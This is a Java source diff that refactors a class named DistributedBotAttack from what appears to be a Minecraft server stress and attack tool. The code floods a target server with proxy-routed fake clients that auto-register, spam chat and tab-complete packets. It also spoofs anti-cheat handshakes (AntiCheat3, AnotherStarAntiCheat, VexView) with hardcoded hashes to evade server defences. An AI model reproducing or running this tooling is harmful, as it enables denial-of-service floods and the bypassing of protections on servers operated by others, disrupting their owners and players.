@@ -7,21 +7,24 @@ import java.lang.reflect.Field;
 import java.net.InetSocketAddress;
 import java.net.Proxy;
 import java.net.Socket;
-import java.util.ArrayList;
-import java.util.List;
-import java.util.Map;
+import java.util.*;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 
+import io.netty.util.internal.ConcurrentSet;
 import org.spacehq.mc.protocol.MinecraftProtocol;
 import org.spacehq.mc.protocol.packet.ingame.client.ClientChatPacket;
+import org.spacehq.mc.protocol.packet.ingame.client.ClientKeepAlivePacket;
 import org.spacehq.mc.protocol.packet.ingame.client.ClientPluginMessagePacket;
 import org.spacehq.mc.protocol.packet.ingame.client.ClientTabCompletePacket;
+import org.spacehq.mc.protocol.packet.ingame.client.player.ClientPlayerChangeHeldItemPacket;
 import org.spacehq.mc.protocol.packet.ingame.client.player.ClientPlayerMovementPacket;
-import org.spacehq.mc.protocol.packet.ingame.client.player.ClientPlayerPositionRotationPacket;
+import org.spacehq.mc.protocol.packet.ingame.client.world.ClientTeleportConfirmPacket;
 import org.spacehq.mc.protocol.packet.ingame.server.ServerJoinGamePacket;
 import org.spacehq.mc.protocol.packet.ingame.server.ServerPluginMessagePacket;
+import org.spacehq.mc.protocol.packet.ingame.server.entity.ServerEntityTeleportPacket;
 import org.spacehq.mc.protocol.packet.ingame.server.entity.player.ServerPlayerPositionRotationPacket;
+import org.spacehq.mc.protocol.packet.ingame.server.window.ServerSetSlotPacket;
 import org.spacehq.packetlib.Client;
 import org.spacehq.packetlib.Session;
 import org.spacehq.packetlib.event.session.ConnectedEvent;
@@ -30,6 +33,7 @@ import org.spacehq.packetlib.event.session.DisconnectingEvent;
 import org.spacehq.packetlib.event.session.PacketReceivedEvent;
 import org.spacehq.packetlib.event.session.PacketSentEvent;
 import org.spacehq.packetlib.event.session.SessionListener;
+import org.spacehq.packetlib.packet.Packet;
 import org.spacehq.packetlib.tcp.TcpSessionFactory;
 
 import luohuayu.ACProtocol.AnotherStarAntiCheat;
@@ -39,11 +43,15 @@ import luohuayu.EndMinecraftPlus.proxy.ProxyPool;
 import luohuayu.MCForgeProtocol.MCForge;
 
 public class DistributedBotAttack extends IAttack {
+    protected boolean attack_motdbefore;
+    protected boolean attack_tab;
+    protected Map<String, String> modList;
+
     private Thread mainThread;
     private Thread tabThread;
     private Thread taskThread;
 
-    public List<Client> clients = new ArrayList<Client>();
+    public Set<Client> clients = new ConcurrentSet<>();
     public ExecutorService pool = Executors.newCachedThreadPool();
 
     private static AntiCheat3 ac3 = new AntiCheat3();
@@ -51,27 +59,30 @@ public class DistributedBotAttack extends IAttack {
 
     private long starttime;
 
-    public DistributedBotAttack(int time, int maxconnect, int joinsleep, boolean motdbefore, boolean tab,
-            Map<String, String> modList) {
-        super(time, maxconnect, joinsleep, motdbefore, tab, modList);
+    public DistributedBotAttack(String ip, int port, int time, int maxconnect, int joinsleep) {
+        super(ip, port, time, maxconnect, joinsleep);
     }
 
-    public void start(final String ip, final int port) {
+    public void setBotConfig(boolean motdbefore, boolean tab, Map<String, String> modList) {
+        this.attack_motdbefore = motdbefore;
+        this.attack_tab = tab;
+        this.modList = modList;
+    }
+
+    public void start() {
         setTask(() -> {
             while (true) {
-                synchronized (clients) {
-                    clients.forEach(c -> {
-                        if (c.getSession().isConnected()) {
-                            if (c.getSession().hasFlag("login")) {
-                                c.getSession().send(new ClientChatPacket(Utils.getRandomString(1, 4) + "喵喵喵喵喵~"));
-                            } else if (c.getSession().hasFlag("join")) {
-                                String pwd = Utils.getRandomString(7, 12);
-                                c.getSession().send(new ClientChatPacket("/register " + pwd + " " + pwd));
-                                c.getSession().setFlag("login", true);
-                            }
-
+                for (Client c : clients) {
+                    if (c.getSession().isConnected()) {
+                        if (c.getSession().hasFlag("login")) {
+                            c.getSession().send(new ClientChatPacket(Utils.getRandomString(1, 4) + "喵喵喵喵喵~"));
+                        } else if (c.getSession().hasFlag("join")) {
+                            String pwd = Utils.getRandomString(7, 12);
+                            c.getSession().send(new ClientChatPacket("/register " + pwd + " " + pwd));
+                            c.getSession().setFlag("login", true);
                         }
-                    });
+
+                    }
                 }
                 Utils.sleep(5 * 1000);
             }
@@ -86,11 +97,10 @@ public class DistributedBotAttack extends IAttack {
                     createClients(ip, port);
                     Utils.sleep(10 * 1000);
 
-                    if (this.attack_time > 0
-                            && (System.currentTimeMillis() - this.starttime) / 1000 > this.attack_time) {
-                        clients.forEach(c -> {
+                    if (this.attack_time > 0 && (System.currentTimeMillis() - this.starttime) / 1000 > this.attack_time) {
+                        for (Client c : clients) {
                             c.getSession().disconnect("");
-                        });
+                        }
                         stop();
                         return;
                     }
@@ -104,14 +114,10 @@ public class DistributedBotAttack extends IAttack {
         if (this.attack_tab) {
             tabThread = new Thread(() -> {
                 while (true) {
-                    synchronized (clients) {
-                        clients.forEach(c -> {
-                            if (c.getSession().isConnected()) {
-                                if (c.getSession().hasFlag("join")) {
-                                    sendTabPacket(c.getSession(), "/");
-                                }
-                            }
-                        });
+                    for (Client c : clients) {
+                        if (c.getSession().isConnected() && c.getSession().hasFlag("join")) {
+                            MultiVersionPacket.sendTabPacket(c.getSession(), "/");
+                        }
                     }
                     Utils.sleep(10);
                 }
@@ -139,47 +145,35 @@ public class DistributedBotAttack extends IAttack {
     }
 
     private void cleanClients() {
-        List<Client> waitRemove = new ArrayList<Client>();
-        synchronized (clients) {
-            clients.forEach(c -> {
-                if (!c.getSession().isConnected()) {
-                    waitRemove.add(c);
-                }
-            });
-            clients.removeAll(waitRemove);
-        }
+        clients.removeIf(c -> !c.getSession().isConnected());
     }
 
     private void createClients(final String ip, int port) {
-        synchronized (ProxyPool.proxys) {
-            ProxyPool.proxys.forEach(p -> {
-                try {
-                    String[] _p = p.split(":");
-                    Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(_p[0], Integer.parseInt(_p[1])));
-                    Client client = createClient(ip, port, Utils.getRandomString(4, 12), proxy);
-                    client.getSession().setReadTimeout(10 * 1000);
-                    client.getSession().setWriteTimeout(10 * 1000);
-                    synchronized (clients) {
-                        clients.add(client);
-                    }
+        for (String p : ProxyPool.proxys) {
+            try {
+                String[] _p = p.split(":");
+                Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(_p[0], Integer.parseInt(_p[1])));
+                Client client = createClient(ip, port, Utils.getRandomString(4, 12), proxy);
+                client.getSession().setReadTimeout(10 * 1000);
+                client.getSession().setWriteTimeout(10 * 1000);
+                clients.add(client);
 
-                    if (this.attack_motdbefore) {
-                        pool.submit(() -> {
-                            getMotd(proxy, ip, port);
-                            client.getSession().connect(false);
-                        });
-                    } else {
+                if (this.attack_motdbefore) {
+                    pool.submit(() -> {
+                        getMotd(proxy, ip, port);
                         client.getSession().connect(false);
-                    }
-
-                    if (this.attack_maxconnect > 0 && (clients.size() > this.attack_maxconnect))
-                        return;
-                    if (this.attack_joinsleep > 0)
-                        Utils.sleep(attack_joinsleep);
-                } catch (Exception e) {
-                    Utils.log("BotThread/CreateClients", e.getMessage());
+                    });
+                } else {
+                    client.getSession().connect(false);
                 }
-            });
+
+                if (this.attack_maxconnect > 0 && (clients.size() > this.attack_maxconnect))
+                    return;
+                if (this.attack_joinsleep > 0)
+                    Utils.sleep(attack_joinsleep);
+            } catch (Exception e) {
+                Utils.log("BotThread/CreateClients", e.getMessage());
+            }
         }
     }
 
@@ -188,34 +182,7 @@ public class DistributedBotAttack extends IAttack {
         new MCForge(client.getSession(), this.modList).init();
         client.getSession().addListener(new SessionListener() {
             public void packetReceived(PacketReceivedEvent e) {
-                if (e.getPacket() instanceof ServerPluginMessagePacket) {
-                    ServerPluginMessagePacket packet = e.getPacket();
-                    switch (packet.getChannel()) {
-                    case "AntiCheat3.4.3":
-                        String code = ac3.uncompress(packet.getData());
-                        byte[] checkData = ac3.getCheckData("AntiCheat3.jar", code,
-                                new String[] { "44f6bc86a41fa0555784c255e3174260" });
-                        e.getSession().send(new ClientPluginMessagePacket("AntiCheat3.4.3", checkData));
-                        break;
-                    case "anotherstaranticheat":
-                        String salt = asac.decodeSPacket(packet.getData());
-                        byte[] data = asac.encodeCPacket(new String[] {"4863f8708f0c24517bb5d108d45f3e15"}, salt);
-                        e.getSession().send(new ClientPluginMessagePacket("anotherstaranticheat", data));
-                        break;
-                    case "VexView":
-                        if (new String(packet.getData()).equals("GET:Verification"))
-                            e.getSession().send(new ClientPluginMessagePacket("VexView", "Verification:1.8.10".getBytes()));
-                        break;
-                    default:
-                    }
-                } else if (e.getPacket() instanceof ServerJoinGamePacket) {
-                    e.getSession().setFlag("join", true);
-                    Utils.log("Client", "[连接成功][" + username + "]");
-                } else if (e.getPacket() instanceof ServerPlayerPositionRotationPacket) {
-                    ServerPlayerPositionRotationPacket packet = e.getPacket();
-                    sendPosPacket(e.getSession(), packet.getX(), packet.getY(), packet.getZ(), packet.getYaw(), packet.getYaw());
-                    e.getSession().send(new ClientPlayerMovementPacket(true));
-                }
+                handlePacket(e.getSession(), e.getPacket(), username);
             }
 
             public void packetSent(PacketSentEvent e) {
@@ -243,8 +210,8 @@ public class DistributedBotAttack extends IAttack {
             if (socket.isConnected()) {
                 OutputStream out = socket.getOutputStream();
                 InputStream in = socket.getInputStream();
-                out.write(new byte[] { 0x07, 0x00, 0x05, 0x01, 0x30, 0x63, (byte) 0xDD, 0x01 });
-                out.write(new byte[] { 0x01, 0x00 });
+                out.write(new byte[]{0x07, 0x00, 0x05, 0x01, 0x30, 0x63, (byte) 0xDD, 0x01});
+                out.write(new byte[]{0x01, 0x00});
                 out.flush();
                 in.read();
 
@@ -263,32 +230,37 @@ public class DistributedBotAttack extends IAttack {
         return false;
     }
 
-    public void sendTabPacket(Session session, String text) {
-        try {
-            Class<?> cls = ClientTabCompletePacket.class;
-            Constructor<?> constructor = cls.getDeclaredConstructor();
-            constructor.setAccessible(true);
-            ClientTabCompletePacket packet = (ClientTabCompletePacket) constructor.newInstance();
-            Field field = cls.getDeclaredField("text");
-            field.setAccessible(true);
-            field.set(packet, text);
-            session.send(packet);
-        } catch (Exception e) {}
-    }
-
-    public void sendPosPacket(Session session, double x, double y, double z, float yaw, float pitch) {
-        try {
-            Class<?> cls = ClientPlayerPositionRotationPacket.class;
-            Constructor<?> constructor;
-            ClientPlayerPositionRotationPacket packet;
-            try {
-                constructor = cls.getConstructor(boolean.class, double.class, double.class, double.class, float.class, float.class);
-                packet = (ClientPlayerPositionRotationPacket) constructor.newInstance(true, x, y, z, yaw, pitch);
-            }catch (NoSuchMethodException ex) {
-                constructor = cls.getConstructor(boolean.class, double.class, double.class, double.class, double.class, float.class, float.class);
-                packet = (ClientPlayerPositionRotationPacket) constructor.newInstance(true, x, y - 1.62, y , z, yaw, pitch);
+    protected void handlePacket(Session session, Packet recvPacket, String username) {
+        if (recvPacket instanceof ServerPluginMessagePacket) {
+            ServerPluginMessagePacket packet = (ServerPluginMessagePacket) recvPacket;
+            switch (packet.getChannel()) {
+                case "AntiCheat3.4.3":
+                    String code = ac3.uncompress(packet.getData());
+                    byte[] checkData = ac3.getCheckData("AntiCheat3.jar", code,
+                            new String[]{"44f6bc86a41fa0555784c255e3174260"});
+                    session.send(new ClientPluginMessagePacket("AntiCheat3.4.3", checkData));
+                    break;
+                case "anotherstaranticheat":
+                    String salt = asac.decodeSPacket(packet.getData());
+                    byte[] data = asac.encodeCPacket(new String[]{"4863f8708f0c24517bb5d108d45f3e15"}, salt);
+                    session.send(new ClientPluginMessagePacket("anotherstaranticheat", data));
+                    break;
+                case "VexView":
+                    if (new String(packet.getData()).equals("GET:Verification"))
+                        session.send(new ClientPluginMessagePacket("VexView", "Verification:1.8.10".getBytes()));
+                    break;
+                default:
             }
-            session.send(packet);
-        } catch (Exception e) {}
+        } else if (recvPacket instanceof ServerJoinGamePacket) {
+            session.setFlag("join", true);
+            Utils.log("Client", "[连接成功][" + username + "]");
+            MultiVersionPacket.sendClientSettingPacket(session, "zh_CN");
+            session.send(new ClientPlayerChangeHeldItemPacket(1));
+        } else if (recvPacket instanceof ServerPlayerPositionRotationPacket) {
+            ServerPlayerPositionRotationPacket packet = (ServerPlayerPositionRotationPacket) recvPacket;
+            MultiVersionPacket.sendPosPacket(session, packet.getX(), packet.getY(), packet.getZ(), packet.getYaw(), packet.getYaw());
+            session.send(new ClientPlayerMovementPacket(true));
+            session.send(new ClientTeleportConfirmPacket(packet.getTeleportId()));
+        }
     }
 }
